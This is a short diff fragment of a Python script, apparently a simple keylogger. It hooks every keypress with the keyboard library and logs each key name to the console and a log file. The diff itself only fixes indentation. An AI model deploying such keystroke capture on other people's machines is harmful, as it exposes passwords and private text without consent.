@@ -18,10 +18,10 @@ handler.setFormatter(formatter)
 logger.addHandler(handler)
 
 def log_keypress(e):
- print(str(e.name))
- logger.info(str(e.name))
+    print(str(e.name))
+    logger.info(str(e.name))
 
 keyboard.hook(log_keypress)
 
 while True:
- pass
+    pass
